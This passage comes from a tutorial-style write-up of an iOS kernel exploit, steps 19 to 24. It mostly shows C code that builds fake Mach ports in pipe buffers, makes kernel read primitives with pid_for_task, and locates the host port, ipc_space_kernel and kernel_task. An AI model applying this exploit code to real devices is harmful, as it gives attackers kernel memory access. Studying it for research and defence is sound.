    			<span class="n">fake_port_offset</span> <span class="o">=</span> <span class="n">port_offset</span><span class="p">;</span>
    			<span class="n">ip_requests</span> <span class="o">=</span> <span class="o">*</span><span class="n">port_ip_requests</span><span class="p">;</span>
    			<span class="o">*</span><span class="n">port_ip_requests</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    		<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    			<span class="c1">// Clear out all the other fake ports.</span>
    			<span class="n">memset</span><span class="p">(</span><span class="n">port</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">SIZE</span><span class="p">(</span><span class="n">ipc_port</span><span class="p">));</span>
    		<span class="p">}</span>
    	<span class="p">});</span>
    	<span class="c1">// Make sure we found it.</span>
    	<span class="k">if</span> <span class="p">(</span><span class="n">ip_requests</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
    		<span class="n">ERROR</span><span class="p">(</span><span class="s">"could not find %s in pipe buffers"</span><span class="p">,</span> <span class="s">"ip_requests"</span><span class="p">);</span>
    		<span class="n">fail</span><span class="p">();</span>
    	<span class="p">}</span>
    	<span class="n">INFO</span><span class="p">(</span><span class="s">"got %s at 0x%016llx"</span><span class="p">,</span> <span class="s">"ip_requests"</span><span class="p">,</span> <span class="n">ip_requests</span><span class="p">);</span>
    	<span class="n">INFO</span><span class="p">(</span><span class="s">"fake port is at offset %zu"</span><span class="p">,</span> <span class="n">fake_port_offset</span><span class="p">);</span>
    	<span class="c1">// Do a write so that the stage0 and stage1 read primitives can start with a pipe read.</span>
    	<span class="n">write_pipe</span><span class="p">();</span></code></pre></figure>

<h4 id="step-19-find-the-address-of-the-base-port">Step 19: Find the address of the base port</h4>

<p>We can find the address of the base port pointer since its at a fixed offset from the <strong>ip_requests</strong> field. Next, we need to find out the address of the base port from the base port pointer using which we can locate our pipe buffer address. However, as discussed a bit earlier, in order to create a proper fake port on which you can use <strong>task_for_pid()</strong> on, you must have a <strong>kobject</strong> field pointing to an address that corresponds to a task. Also, the task will have a <strong>bsd_info</strong> pointing to a proc. This is achieved by creating a fake port of type <strong>IKOT_NONE</strong>, creating a fake task and setting the <strong>bsd_info</strong> field pointing to the (<strong>AddressToRead - OFFSET(pidInProcStruct)</strong>), and then sending that fask task in a mach message to the fake port. By looking at the port’s <strong>ip_messages.imq_messages</strong> field via the pipe we can get the address of the <strong>ipc_kmsg</strong> struct containing the task address, and then replace the port to an <strong>IKOT_TASK</strong> port with the <strong>kobject</strong> field pointing tot the fake task. Now that we have built an initial read primitive, we can then use the function <strong>stage0_read64</strong> to read the <strong>base_port</strong> address.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="c1">// 19\. Now that we know the address of an array that contains a pointer to base_port, we</span>
    	<span class="c1">// need a way to read data from that address so we can locate our pipe buffer in memory.</span>
    	<span class="c1">//</span>
    	<span class="c1">// We'll use the traditional pid_for_task() technique to read 4 bytes of kernel memory.</span>
    	<span class="c1">// However, in order for this technique to work, we need to get a fake task containing an</span>
    	<span class="c1">// offset pointer to the address we want to read at a known location in memory. We can do</span>
    	<span class="c1">// that by initializing our fake port, sending a Mach message containing our fake task to</span>
    	<span class="c1">// the port, and reading out the port's imq_messages field.</span>
    	<span class="c1">//</span>
    	<span class="c1">// An unfortunate consequence of this technique is that each 4-byte read leaks an ipc_kmsg</span>
    	<span class="c1">// allocation. Thus, we'll store the leaked kmsgs so that we can deallocate them later.</span>
    	<span class="kt">uint64_t</span> <span class="n">leaked_kmsgs</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="p">{};</span>
    	<span class="kt">uint64_t</span> <span class="n">address_of_base_port_pointer</span> <span class="o">=</span> <span class="n">ip_requests</span>
    		<span class="o">+</span> <span class="mi">1</span> <span class="o">*</span> <span class="nf">SIZE</span><span class="p">(</span><span class="n">ipc_port_request</span><span class="p">)</span> <span class="o">+</span> <span class="n">OFFSET</span><span class="p">(</span><span class="n">ipc_port_request</span><span class="p">,</span> <span class="n">ipr_soright</span><span class="p">);</span>
    	<span class="n">base_port_address</span> <span class="o">=</span> <span class="n">stage0_read64</span><span class="p">(</span><span class="n">address_of_base_port_pointer</span><span class="p">,</span> <span class="n">leaked_kmsgs</span><span class="p">);</span>
    	<span class="n">INFO</span><span class="p">(</span><span class="s">"base port is at 0x%016llx"</span><span class="p">,</span> <span class="n">base_port_address</span><span class="p">);</span>
    	<span class="c1">// Check that it has the offset that we expect.</span>
    	<span class="k">if</span> <span class="p">(</span><span class="n">base_port_address</span> <span class="o">%</span> <span class="n">pipe_buffer_size</span> <span class="o">!=</span> <span class="n">fake_port_offset</span><span class="p">)</span> <span class="p">{</span>
    		<span class="n">ERROR</span><span class="p">(</span><span class="s">"base_port at wrong offset"</span><span class="p">);</span>
    	<span class="p">}</span></code></pre></figure>

<p>The <strong>stage0_read</strong> is a really handy function and basically does the job of reading out the kernel memory 32 bits at a time. It basically does the following steps.</p>

<ol>
  <li>Create a fake port in the pipe, set all the required properties and set the <strong>IKOT</strong> type as <strong>IKOT_NONE</strong></li>
  <li>Create a fake task, set the <strong>bsd_info</strong> field depending on the address you want to read and send it to the port in a mach message.</li>
  <li>Read the receiver port contents by reading the pipe and finds the address of the task from its <strong>imq_messages</strong> field.</li>
  <li>Rewrite the port by rewriting the pipe and now set the <strong>IKOT</strong> type as <strong>IKOT_TASK</strong> to create it as a fake task port so one can use the <strong>task_for_pid()</strong> call on it</li>
  <li>Call <strong>pid_for_task</strong> to read kernel memory</li>
</ol>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="o">*</span>
     <span class="o">*</span> <span class="n">stage0_read32</span>
     <span class="o">*</span>
     <span class="o">*</span> <span class="n">Description</span><span class="o">:</span>
     <span class="o">*</span> 	<span class="n">Read</span> <span class="n">a</span> <span class="mi">32</span><span class="o">-</span><span class="n">bit</span> <span class="n">value</span> <span class="n">from</span> <span class="n">memory</span> <span class="n">using</span> <span class="n">our</span> <span class="n">fake</span> <span class="n">port</span><span class="p">.</span>
     <span class="o">*</span>
     <span class="o">*</span> 	<span class="n">Note</span> <span class="n">that</span> <span class="n">this</span> <span class="n">is</span> <span class="n">the</span> <span class="n">very</span> <span class="n">first</span> <span class="n">read</span> <span class="n">primitive</span> <span class="n">we</span> <span class="n">get</span><span class="p">,</span> <span class="n">before</span> <span class="n">we</span> <span class="n">know</span> <span class="n">the</span> <span class="n">address</span> <span class="n">of</span> <span class="n">the</span>
     <span class="o">*</span> 	<span class="n">pipe</span> <span class="n">buffers</span><span class="p">.</span> <span class="n">Each</span> <span class="mi">32</span><span class="o">-</span><span class="n">bit</span> <span class="n">read</span> <span class="n">leaks</span> <span class="n">an</span> <span class="n">ipc_kmsg</span><span class="p">.</span> <span class="n">We</span><span class="err">'</span><span class="n">ll</span> <span class="n">want</span> <span class="n">to</span> <span class="n">use</span> <span class="n">this</span> <span class="n">primitive</span> <span class="n">to</span> <span class="n">get</span>
     <span class="o">*</span> 	<span class="n">the</span> <span class="n">address</span> <span class="n">of</span> <span class="n">our</span> <span class="n">pipe</span> <span class="n">buffers</span> <span class="n">as</span> <span class="n">quickly</span> <span class="n">as</span> <span class="n">possible</span><span class="p">.</span>
     <span class="o">*</span>
     <span class="o">*</span> 	<span class="n">This</span> <span class="n">routine</span> <span class="n">performs</span> <span class="mi">2</span> <span class="n">full</span> <span class="n">pipe</span> <span class="n">transfers</span><span class="p">,</span> <span class="n">starting</span> <span class="n">with</span> <span class="n">a</span> <span class="n">read</span><span class="p">.</span>
     <span class="err">*/</span>
    <span class="k">static</span> <span class="kt">uint32_t</span>
    <span class="nf">stage0_read32</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">address</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="o">*</span><span class="n">kmsg</span><span class="p">)</span> <span class="p">{</span>
    	<span class="c1">// Do a read to make the pipe available for a write.</span>
    	<span class="n">read_pipe</span><span class="p">();</span>
    	<span class="c1">// Initialize the port as a regular Mach port that's empty and has room for 1 message.</span>
    	<span class="kt">uint8_t</span> <span class="o">*</span><span class="n">fake_port_data</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint8_t</span> <span class="o">*</span><span class="p">)</span> <span class="n">pipe_buffer</span> <span class="o">+</span> <span class="n">fake_port_offset</span><span class="p">;</span>
    	<span class="n">FIELD</span><span class="p">(</span><span class="n">fake_port_data</span><span class="p">,</span> <span class="n">ipc_port</span><span class="p">,</span> <span class="n">ip_bits</span><span class="p">,</span>      <span class="kt">uint32_t</span><span class="p">)</span> <span class="o">=</span> <span class="n">io_makebits</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">IOT_PORT</span><span class="p">,</span> <span class="n">IKOT_NONE</span><span class="p">);</span>
    	<span class="n">FIELD</span><span class="p">(</span><span class="n">fake_port_data</span><span class="p">,</span> <span class="n">ipc_port</span><span class="p">,</span> <span class="n">waitq_flags</span><span class="p">,</span>  <span class="kt">uint32_t</span><span class="p">)</span> <span class="o">=</span> <span class="n">mach_port_waitq_flags</span><span class="p">();</span>
    	<span class="n">FIELD</span><span class="p">(</span><span class="n">fake_port_data</span><span class="p">,</span> <span class="n">ipc_port</span><span class="p">,</span> <span class="n">imq_messages</span><span class="p">,</span> <span class="kt">uint64_t</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    	<span class="n">FIELD</span><span class="p">(</span><span class="n">fake_port_data</span><span class="p">,</span> <span class="n">ipc_port</span><span class="p">,</span> <span class="n">imq_msgcount</span><span class="p">,</span> <span class="kt">uint16_t</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    	<span class="n">FIELD</span><span class="p">(</span><span class="n">fake_port_data</span><span class="p">,</span> <span class="n">ipc_port</span><span class="p">,</span> <span class="n">imq_qlimit</span><span class="p">,</span>   <span class="kt">uint16_t</span><span class="p">)</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
    	<span class="n">write_pipe</span><span class="p">();</span>
    	<span class="c1">// We'll pretend that the 32-bit value we want to read is the p_pid field of a proc struct.</span>
    	<span class="c1">// Then, we'll get a pointer to that fake proc at a known address in kernel memory by</span>
    	<span class="c1">// sending the pointer to the fake proc in a Mach message to the fake port.</span>
    	<span class="kt">uint64_t</span> <span class="n">fake_proc_address</span> <span class="o">=</span> <span class="n">address</span> <span class="o">-</span> <span class="n">OFFSET</span><span class="p">(</span><span class="n">proc</span><span class="p">,</span> <span class="n">p_pid</span><span class="p">);</span>
    	<span class="kt">uint64_t</span> <span class="n">offset_from_kmsg_to_fake_task</span><span class="p">;</span>
    	<span class="n">stage0_send_fake_task_message</span><span class="p">(</span><span class="n">fake_proc_address</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">offset_from_kmsg_to_fake_task</span><span class="p">);</span>
    	<span class="c1">// Read back the port contents to get the address of the ipc_kmsg containing our fake proc</span>
    	<span class="c1">// pointer.</span>
    	<span class="n">read_pipe</span><span class="p">();</span>
    	<span class="kt">uint64_t</span> <span class="n">kmsg_address</span> <span class="o">=</span> <span class="n">FIELD</span><span class="p">(</span><span class="n">fake_port_data</span><span class="p">,</span> <span class="n">ipc_port</span><span class="p">,</span> <span class="n">imq_messages</span><span class="p">,</span> <span class="kt">uint64_t</span><span class="p">);</span>
    	<span class="o">*</span><span class="n">kmsg</span> <span class="o">=</span> <span class="n">kmsg_address</span><span class="p">;</span>
    	<span class="c1">// Now rewrite the port as a fake task port pointing to our fake task.</span>
    	<span class="kt">uint64_t</span> <span class="n">fake_task_address</span> <span class="o">=</span> <span class="n">kmsg_address</span> <span class="o">+</span> <span class="n">offset_from_kmsg_to_fake_task</span><span class="p">;</span>
    	<span class="n">FIELD</span><span class="p">(</span><span class="n">fake_port_data</span><span class="p">,</span> <span class="n">ipc_port</span><span class="p">,</span> <span class="n">ip_bits</span><span class="p">,</span>    <span class="kt">uint32_t</span><span class="p">)</span> <span class="o">=</span> <span class="n">io_makebits</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">IOT_PORT</span><span class="p">,</span> <span class="n">IKOT_TASK</span><span class="p">);</span>
    	<span class="n">FIELD</span><span class="p">(</span><span class="n">fake_port_data</span><span class="p">,</span> <span class="n">ipc_port</span><span class="p">,</span> <span class="n">ip_kobject</span><span class="p">,</span> <span class="kt">uint64_t</span><span class="p">)</span> <span class="o">=</span> <span class="n">fake_task_address</span><span class="p">;</span>
    	<span class="n">write_pipe</span><span class="p">();</span>
    	<span class="c1">// Now use pid_for_task() to read our value.</span>
    	<span class="kt">int</span> <span class="n">pid</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
    	<span class="n">kern_return_t</span> <span class="n">kr</span> <span class="o">=</span> <span class="n">pid_for_task</span><span class="p">(</span><span class="n">fake_port</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pid</span><span class="p">);</span>
    	<span class="k">if</span> <span class="p">(</span><span class="n">kr</span> <span class="o">!=</span> <span class="n">KERN_SUCCESS</span><span class="p">)</span> <span class="p">{</span>
    		<span class="n">ERROR</span><span class="p">(</span><span class="s">"%s returned %d: %s"</span><span class="p">,</span> <span class="s">"pid_for_task"</span><span class="p">,</span> <span class="n">kr</span><span class="p">,</span> <span class="n">mach_error_string</span><span class="p">(</span><span class="n">kr</span><span class="p">));</span>
    		<span class="n">ERROR</span><span class="p">(</span><span class="s">"could not read kernel memory in stage %d using %s"</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="s">"pid_for_task"</span><span class="p">);</span>
    		<span class="n">fail</span><span class="p">();</span>
    	<span class="p">}</span>
    	<span class="k">return</span> <span class="p">(</span><span class="kt">uint32_t</span><span class="p">)</span> <span class="n">pid</span><span class="p">;</span>
    <span class="p">}</span></code></pre></figure>

<h4 id="step-20-compute-the-address-of-the-fake-port">Step 20: Compute the address of the fake port</h4>

<p>Since we know the <strong>base_port</strong> address and given the fact that we know the offset from the base port to the fake port (we defined this earlier in Step 3), it is possible for us to calculate the fake port address.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="c1">// 20\. Now use base_port_address to compute the address of the fake port and the containing</span>
    	<span class="c1">// pipe buffer, and choose an offset for our fake task in the pipe buffer as well. At this</span>
    	<span class="c1">// point, we can now use our stage 1 read primitive.</span>
    	<span class="n">fake_port_address</span> <span class="o">=</span> <span class="n">base_port_address</span> <span class="o">+</span> <span class="n">base_port_to_fake_port_offset</span><span class="p">;</span>
    	<span class="n">pipe_buffer_address</span> <span class="o">=</span> <span class="n">fake_port_address</span> <span class="o">&amp;</span> <span class="o">~</span><span class="p">(</span><span class="n">pipe_buffer_size</span> <span class="o">-</span> <span class="mi">1</span><span class="p">);</span>
    	<span class="n">fake_task_offset</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    	<span class="k">if</span> <span class="p">(</span><span class="n">fake_port_offset</span> <span class="o">&lt;</span> <span class="n">FAKE_TASK_SIZE</span><span class="p">)</span> <span class="p">{</span>
    		<span class="n">fake_task_offset</span> <span class="o">=</span> <span class="n">pipe_buffer_size</span> <span class="o">-</span> <span class="n">FAKE_TASK_SIZE</span><span class="p">;</span>
    	<span class="p">}</span></code></pre></figure>

<h4 id="step-21-compute-the-address-of-your-own-task-port">Step 21: Compute the address of your own task port</h4>

<p>Now that we know the address of the fake task and we can create the port, we can create a better read primitive and call it stage 1. The next step is to compute the address of your own task port. The function <strong>stage1_find_port_address</strong> takes the input as a task and gets the address of the task port using the stage 1 read primtive.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="c1">// 21\. Now that we have the address of our pipe buffer, we can use the stage 1 read</span>
    	<span class="c1">// primitive. Get the address of our own task port, which we'll need later.</span>
    	<span class="kt">uint64_t</span> <span class="n">task_port_address</span> <span class="o">=</span> <span class="n">stage1_find_port_address</span><span class="p">(</span><span class="n">mach_task_self</span><span class="p">());</span>
    <span class="cm">/*
     * stage1_find_port_address
     *
     * Description:
     * 	Get the address of a Mach port to which we hold a send right.
     */</span>
    <span class="k">static</span> <span class="kt">uint64_t</span>
    <span class="nf">stage1_find_port_address</span><span class="p">(</span><span class="n">mach_port_t</span> <span class="n">port</span><span class="p">)</span> <span class="p">{</span>
    	<span class="c1">// Create the message. We'll place a send right to the target port in msgh_local_port.</span>
    	<span class="n">mach_msg_header_t</span> <span class="n">msg</span> <span class="o">=</span> <span class="p">{};</span>
    	<span class="n">msg</span><span class="p">.</span><span class="n">msgh_bits</span>        <span class="o">=</span> <span class="n">MACH_MSGH_BITS_SET</span><span class="p">(</span><span class="n">MACH_MSG_TYPE_MAKE_SEND</span><span class="p">,</span> <span class="n">MACH_MSG_TYPE_COPY_SEND</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    	<span class="n">msg</span><span class="p">.</span><span class="n">msgh_remote_port</span> <span class="o">=</span> <span class="n">base_port</span><span class="p">;</span>
    	<span class="n">msg</span><span class="p">.</span><span class="n">msgh_local_port</span>  <span class="o">=</span> <span class="n">port</span><span class="p">;</span>
    	<span class="n">msg</span><span class="p">.</span><span class="n">msgh_size</span>        <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">msg</span><span class="p">);</span>
    	<span class="n">msg</span><span class="p">.</span><span class="n">msgh_id</span>          <span class="o">=</span> <span class="err">'</span><span class="n">port</span><span class="err">'</span><span class="p">;</span>
    	<span class="c1">// Send the message to the base port.</span>
    	<span class="n">kern_return_t</span> <span class="n">kr</span> <span class="o">=</span> <span class="n">mach_msg</span><span class="p">(</span>
    			<span class="o">&amp;</span><span class="n">msg</span><span class="p">,</span>
    			<span class="n">MACH_SEND_MSG</span> <span class="o">|</span> <span class="n">MACH_SEND_TIMEOUT</span><span class="p">,</span>
    			<span class="k">sizeof</span><span class="p">(</span><span class="n">msg</span><span class="p">),</span>
    			<span class="mi">0</span><span class="p">,</span>
    			<span class="n">MACH_PORT_NULL</span><span class="p">,</span>
    			<span class="mi">0</span><span class="p">,</span>
    			<span class="n">MACH_PORT_NULL</span><span class="p">);</span>
    	<span class="k">if</span> <span class="p">(</span><span class="n">kr</span> <span class="o">!=</span> <span class="n">KERN_SUCCESS</span><span class="p">)</span> <span class="p">{</span>
    		<span class="n">ERROR</span><span class="p">(</span><span class="s">"%s returned %d: %s"</span><span class="p">,</span> <span class="s">"mach_msg"</span><span class="p">,</span> <span class="n">kr</span><span class="p">,</span> <span class="n">mach_error_string</span><span class="p">(</span><span class="n">kr</span><span class="p">));</span>
    		<span class="n">ERROR</span><span class="p">(</span><span class="s">"could not stash our port in a message to the base port"</span><span class="p">);</span>
    		<span class="n">fail</span><span class="p">();</span>
    	<span class="p">}</span>
    	<span class="c1">// Read the address of the kmsg.</span>
    	<span class="kt">uint64_t</span> <span class="n">base_port_imq_messages</span> <span class="o">=</span> <span class="n">base_port_address</span> <span class="o">+</span> <span class="n">OFFSET</span><span class="p">(</span><span class="n">ipc_port</span><span class="p">,</span> <span class="n">imq_messages</span><span class="p">);</span>
    	<span class="kt">uint64_t</span> <span class="n">kmsg</span> <span class="o">=</span> <span class="n">stage1_read64</span><span class="p">(</span><span class="n">base_port_imq_messages</span><span class="p">);</span>
    	<span class="c1">// Read the message's msgh_local_port field to get the address of the target port.</span>
    	<span class="c1">// +-----------------+---+--------+---------+</span>
    	<span class="c1">// | struct ipc_kmsg |   | header | trailer |</span>
    	<span class="c1">// +-----------------+---+--------+---------+</span>
    	<span class="kt">uint64_t</span> <span class="n">msgh_local_port</span> <span class="o">=</span> <span class="n">kmsg</span> <span class="o">+</span> <span class="n">ipc_kmsg_size_for_message_size</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">msg</span><span class="p">))</span>
    		<span class="o">-</span> <span class="n">MAX_TRAILER_SIZE</span> <span class="o">-</span> <span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">mach_msg_header_t</span><span class="p">)</span> <span class="o">+</span> <span class="n">MACH_HEADER_SIZE_DELTA</span><span class="p">)</span>
    		<span class="o">+</span> <span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="kt">uint32_t</span><span class="p">)</span> <span class="o">+</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">uint32_t</span><span class="p">)</span> <span class="o">+</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">uint64_t</span><span class="p">));</span>
    	<span class="kt">uint64_t</span> <span class="n">port_address</span> <span class="o">=</span> <span class="n">stage1_read64</span><span class="p">(</span><span class="n">msgh_local_port</span><span class="p">);</span>
    	<span class="c1">// Discard the message.</span>
    	<span class="n">port_discard_messages</span><span class="p">(</span><span class="n">base_port</span><span class="p">);</span>
    	<span class="k">return</span> <span class="n">port_address</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="cm">/*
     * stage1_read32
     *
     * Description:
     * 	Read a 32-bit value from kernel memory using our fake port.
     *
     * 	This primitive requires that we know the address of the pipe buffer containing our port.
     */</span>
    <span class="k">static</span> <span class="kt">uint32_t</span>
    <span class="nf">stage1_read32</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">address</span><span class="p">)</span> <span class="p">{</span>
    	<span class="c1">// Do a read to make the pipe available for a write.</span>
    	<span class="n">read_pipe</span><span class="p">();</span>
    	<span class="c1">// Create our fake task. The task's proc's p_pid field overlaps with the address we want to</span>
    	<span class="c1">// read.</span>
    	<span class="kt">uint64_t</span> <span class="n">fake_proc_address</span> <span class="o">=</span> <span class="n">address</span> <span class="o">-</span> <span class="n">OFFSET</span><span class="p">(</span><span class="n">proc</span><span class="p">,</span> <span class="n">p_pid</span><span class="p">);</span>
    	<span class="kt">uint64_t</span> <span class="n">fake_task_address</span> <span class="o">=</span> <span class="n">pipe_buffer_address</span> <span class="o">+</span> <span class="n">fake_task_offset</span><span class="p">;</span>
    	<span class="kt">uint8_t</span> <span class="o">*</span><span class="n">fake_task</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint8_t</span> <span class="o">*</span><span class="p">)</span> <span class="n">pipe_buffer</span> <span class="o">+</span> <span class="n">fake_task_offset</span><span class="p">;</span>
    	<span class="n">FIELD</span><span class="p">(</span><span class="n">fake_task</span><span class="p">,</span> <span class="n">task</span><span class="p">,</span> <span class="n">ref_count</span><span class="p">,</span> <span class="kt">uint64_t</span><span class="p">)</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
    	<span class="n">FIELD</span><span class="p">(</span><span class="n">fake_task</span><span class="p">,</span> <span class="n">task</span><span class="p">,</span> <span class="n">bsd_info</span><span class="p">,</span>  <span class="kt">uint64_t</span><span class="p">)</span> <span class="o">=</span> <span class="n">fake_proc_address</span><span class="p">;</span>
    	<span class="c1">// Initialize the port as a fake task port pointing to our fake task.</span>
    	<span class="kt">uint8_t</span> <span class="o">*</span><span class="n">fake_port_data</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint8_t</span> <span class="o">*</span><span class="p">)</span> <span class="n">pipe_buffer</span> <span class="o">+</span> <span class="n">fake_port_offset</span><span class="p">;</span>
    	<span class="n">FIELD</span><span class="p">(</span><span class="n">fake_port_data</span><span class="p">,</span> <span class="n">ipc_port</span><span class="p">,</span> <span class="n">ip_bits</span><span class="p">,</span>    <span class="kt">uint32_t</span><span class="p">)</span> <span class="o">=</span> <span class="n">io_makebits</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">IOT_PORT</span><span class="p">,</span> <span class="n">IKOT_TASK</span><span class="p">);</span>
    	<span class="n">FIELD</span><span class="p">(</span><span class="n">fake_port_data</span><span class="p">,</span> <span class="n">ipc_port</span><span class="p">,</span> <span class="n">ip_kobject</span><span class="p">,</span> <span class="kt">uint64_t</span><span class="p">)</span> <span class="o">=</span> <span class="n">fake_task_address</span><span class="p">;</span>
    	<span class="c1">// Write our buffer to kernel memory.</span>
    	<span class="n">write_pipe</span><span class="p">();</span>
    	<span class="c1">// Now use pid_for_task() to read our value.</span>
    	<span class="kt">int</span> <span class="n">pid</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
    	<span class="n">kern_return_t</span> <span class="n">kr</span> <span class="o">=</span> <span class="n">pid_for_task</span><span class="p">(</span><span class="n">fake_port</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pid</span><span class="p">);</span>
    	<span class="k">if</span> <span class="p">(</span><span class="n">kr</span> <span class="o">!=</span> <span class="n">KERN_SUCCESS</span><span class="p">)</span> <span class="p">{</span>
    		<span class="n">ERROR</span><span class="p">(</span><span class="s">"%s returned %d: %s"</span><span class="p">,</span> <span class="s">"pid_for_task"</span><span class="p">,</span> <span class="n">kr</span><span class="p">,</span> <span class="n">mach_error_string</span><span class="p">(</span><span class="n">kr</span><span class="p">));</span>
    		<span class="n">ERROR</span><span class="p">(</span><span class="s">"could not read kernel memory in stage %d using %s"</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="s">"pid_for_task"</span><span class="p">);</span>
    		<span class="n">fail</span><span class="p">();</span>
    	<span class="p">}</span>
    	<span class="k">return</span> <span class="p">(</span><span class="kt">uint32_t</span><span class="p">)</span> <span class="n">pid</span><span class="p">;</span>
    <span class="p">}</span></code></pre></figure>

<h4 id="step-22-get-the-address-of-the-host-port">Step 22: Get the address of the Host port</h4>

<p>We need to get the host port address first using which we can find the <strong>ipc_space_kernel</strong> in later steps. In order to achieve a full kernel read/write, we need to find kernel <strong>vm_map</strong> and the kernel <strong>ipc_space</strong>. Since the <strong>ipc_space_kernel</strong> can be identified using the host port’s receiver field, it is essential to find the address of the host port.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="c1">// 22\. Our next goal is to build a fake kernel_task port that allows us to read and write</span>
    	<span class="c1">// kernel memory with mach_vm_read()/mach_vm_write(). But in order to do that, we'll first</span>
    	<span class="c1">// need to get ipc_space_kernel and kernel_map. We'll use Ian's technique from multi_path</span>
    	<span class="c1">// for this.</span>
    	<span class="c1">//</span>
    	<span class="c1">// First things first, get the address of the host port.</span>
    	<span class="kt">uint64_t</span> <span class="n">host_port_address</span> <span class="o">=</span> <span class="n">stage1_find_port_address</span><span class="p">(</span><span class="n">host</span><span class="p">);</span></code></pre></figure>

<h4 id="step-23-get-ipc_space_kernel-from-the-host-ports-ip_receiver">Step 23: Get ipc_space_kernel from the host port’s ip_receiver</h4>

<p>Recall from Part 1 that the <strong>ipc_port</strong> struct has a receiver field which points to the ipc_space. We can read the <strong>ipc_space_kernel</strong> by reading the host ports <strong>ip_receiver</strong> field.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="c1">// 23\. We can get ipc_space_kernel from the host port's ip_receiver.</span>
    	<span class="kt">uint64_t</span> <span class="n">host_port_ip_receiver</span> <span class="o">=</span> <span class="n">host_port_address</span> <span class="o">+</span> <span class="n">OFFSET</span><span class="p">(</span><span class="n">ipc_port</span><span class="p">,</span> <span class="n">ip_receiver</span><span class="p">);</span>
    	<span class="kt">uint64_t</span> <span class="n">ipc_space_kernel</span> <span class="o">=</span> <span class="n">stage1_read64</span><span class="p">(</span><span class="n">host_port_ip_receiver</span><span class="p">);</span></code></pre></figure>

<h4 id="step-24-get-the-address-of-the-kernel-task-port">Step 24: Get the address of the kernel task port</h4>

<p>The next step is to find the kernel <strong>vm_map</strong>, and to do that we can first find the kernel task port and from there onwards get the <strong>vm_map</strong> at a fixed offset. In the heap, the kernel task port would be near to the host port, so therefore we can iterate into that particular block as task ports and identify the kernel task port and subsequently get the kernel <strong>vm_map</strong>.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="c1">// 24\. Now we'll iterate through all the ports in the host port's block to try and find the</span>
    	<span class="c1">// kernel task port, which will give us the address of the kernel task.</span>
    	<span class="n">kernel_task</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    	<span class="kt">uint64_t</span> <span class="n">port_block</span> <span class="o">=</span> <span class="n">host_port_address</span> <span class="o">&amp;</span> <span class="o">~</span><span class="p">(</span><span class="n">BLOCK_SIZE</span><span class="p">(</span><span class="n">ipc_port</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">);</span>
    	<span class="n">iterate_ipc_ports</span><span class="p">(</span><span class="n">BLOCK_SIZE</span><span class="p">(</span><span class="n">ipc_port</span><span class="p">),</span> <span class="o">^</span><span class="p">(</span><span class="kt">size_t</span> <span class="n">port_offset</span><span class="p">,</span> <span class="n">bool</span> <span class="o">*</span><span class="n">stop</span><span class="p">)</span> <span class="p">{</span>
    		<span class="kt">uint64_t</span> <span class="n">candidate_port</span> <span class="o">=</span> <span class="n">port_block</span> <span class="o">+</span> <span class="n">port_offset</span><span class="p">;</span>
    		<span class="n">bool</span> <span class="n">found</span> <span class="o">=</span> <span class="n">stage1_check_kernel_task_port</span><span class="p">(</span><span class="n">candidate_port</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">kernel_task</span><span class="p">);</span>
    		<span class="o">*</span><span class="n">stop</span> <span class="o">=</span> <span class="n">found</span><span class="p">;</span>
    	<span class="p">});</span>
    	<span class="c1">// Make sure we got the kernel_task's address.</span>
    	<span class="k">if</span> <span class="p">(</span><span class="n">kernel_task</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
    		<span class="n">ERROR</span><span class="p">(</span><span class="s">"could not find kernel_task port"</span><span class="p">);</span>
    		<span class="n">fail</span><span class="p">();</span>
    	<span class="p">}</span>
    	<span class="n">INFO</span><span class="p">(</span><span class="s">"kernel_task is at 0x%016llx"</span><span class="p">,</span> <span class="n">kernel_task</span><span class="p">);</span></code></pre></figure>

